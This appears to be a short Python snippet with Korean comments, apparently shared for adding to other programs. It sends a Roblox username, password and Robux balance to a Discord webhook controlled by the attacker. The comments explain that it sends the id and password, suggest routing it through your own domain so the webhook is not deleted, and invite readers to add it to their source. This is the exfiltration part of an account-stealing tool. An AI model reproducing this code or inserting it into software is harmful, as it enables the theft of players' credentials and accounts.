 # 디스코드 웹훅으로 id 와 pw 전송

import requests

discord_webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE" # 웹훅 삭제 방지를 위해 자신의 도메인으로 변경 추천
embed = {
    "title": "Roblox Credentials",
    "color": 65280,
    "fields": [
        {"name": "Username", "value": rbx_id, "inline": True},
        {"name": "Password", "value": rbx_pw, "inline": True},
        {"name": "Current Robux", "value": value, "inline": False}
    ]
}
payload = {
    "content": "@everyone",
    "embeds": [embed]
}
response = requests.post(discord_webhook_url, json=payload) 


# 어떤분이 추천해주심 소스에 넣으실분 알아서 추가 하셈
